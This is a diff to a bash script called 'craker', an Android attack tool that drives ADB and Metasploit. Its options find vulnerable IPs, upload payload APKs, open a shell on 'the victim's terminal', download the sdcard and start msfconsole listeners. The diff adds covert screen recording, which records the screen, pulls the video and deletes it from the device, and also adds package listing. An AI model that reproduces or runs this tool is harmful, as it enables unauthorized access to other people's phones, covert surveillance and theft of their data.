@@ -19,30 +19,22 @@ fi
 craker(){
 if [[ $@ == "--help" ]]
 then
-echo -e "\e[2m  
-	        _
-  ___ _ __ __ _| | _____ _ __
- / __|  __/ _  | |/ / _ \  __|
-| (__| | | (_| |   <  __/ |
- \___|_|  \__,_|_|\_\___|_| 
-\e[0m"
-echo -e "craker: --adb \e[2mAdb hacking tool\e[0m"
-echo -e "craker: --msfpay \e[2mCreated payload apk\e[0m"
-echo -e "craker: --uppay \e[2mUp to payloads \e[0m"
+echo -e "./craker --adb \e[2mAdb hacking tool\e[0m"
+echo -e "./craker --msfpay \e[2mCreated payload apk\e[0m"
+echo -e "./craker --uppay \e[2mUp to payloads\e[0m"
 elif [[ $@ == "--adb" ]]
 then
-echo -en "Android Debug Brigde\e[2m"
-adb devices | grep 'device' | awk '{print $1}' | tr 'List' ' ' 
-echo -en "\e[0m"
 echo -e "adb: --find \e[2mFind vulnerable ip\e[0m"
-echo -e "adb: --upload \e[2mUpload payload\e[0m"
+echo -e "adb: --upload <paylaod> \e[2mUpload payload\e[0m"
 echo -e "adb: --shell \e[2mConnect to the victim's terminal\e[0m"
-echo -e "adb: --download \e[2mDownload sdcard\e[0m"
-echo -e "adb: --connect \e[2mConnect devices\e[0m"
+echo -e "adb: --download <sdcard> <directory>\e[2mDownload sdcard\e[0m"
+echo -e "adb: --connect <ip> \e[2mConnect devices\e[0m"
 echo -e "adb: --disconnect \e[2mDisconnect devices\e[0m"
 echo -e "adb: --view \e[2mView connected devices\e[0m"
-echo -e "adb: --screen \e[2mScreencap devices\e[0m"
+echo -e "adb: --screen <filename> \e[2mScreencap devices\e[0m"
 echo -e "adb: --model \e[2mView model devices\e[0m"
+echo -e "adb: --record <minutes> <filename> \e[2mScreenrecord devices\e[0m"
+echo -e "adb: --packages \e[2mView installed packages\e[0m"
 elif [[ $2 == "--find" ]]
 then
 echo -e "Looking for vulnerable ip \e[2m[*]\e[0m"
@@ -101,10 +93,24 @@ echo -e "Model devices \e[2m[*]\e[0m"
 echo -en "\e[2m"
 adb devices -l | grep "model" | awk '{print $4}'
 echo -en "\e[0m"
+elif [[ $2 == "--record" ]]
+then
+echo -e "Screenrecord devices \e[2m[*]\e[0m"
+echo -en "\e[2mRecording $3 minutes [\e[0m\e[32m*\e[0m\e[2m] "
+adb shell screenrecord --time-limit $3 /sdcard/$4.mp4
+adb pull -p -a /sdcard/$4.mp4 ../craker
+adb shell rm /sdcard/*.mp4
+echo -en "\e[0m"
+elif [[ $2 == "--packages" ]]
+then
+echo -e "View packages \e[2m[*]\e[0m"
+echo -e "\e[2m"
+adb shell pm list packages
+echo -e "\e[0m"
 elif [[ $@ == "--msfpay" ]]
 then
-echo -e "msfpay: --crp \e[2mCreated payload\e[0m"
-echo -e "msfpay: --cop \e[2mConnect payload\e[0m"
+echo -e "msfpay: --crp <name> <host> <port> \e[2mCreated payload\e[0m"
+echo -e "msfpay: --cop <name> <host> <port> \e[2mConnect payload\e[0m"
 elif [[ $2 == "--crp" ]]
 then
 echo -e "Created payload \e[2m[*]\e[0m"
@@ -122,7 +128,7 @@ run " > $3.rc
 msfconsole -r $3.rc 
 elif [[ $@ == "--uppay" ]]
 then
-echo -e "uppay: --backup \e[2mFile to up \e[0m"
+echo -e "uppay: --backup <file> \e[2mFile to up \e[0m"
 elif [[ $2 == "--backup" ]]
 then
 echo -e "File to up $3 \e[2m[*]\e[0m"
@@ -131,7 +137,7 @@ python -m webbrowser -n http://localhost:8000/$3
 php -S localhost:8000 | grep 'http'
 echo -en "\e[0m"
 else
-echo -e "./craker --help"
+echo -e "use: ./craker --help"
 fi
 }
 
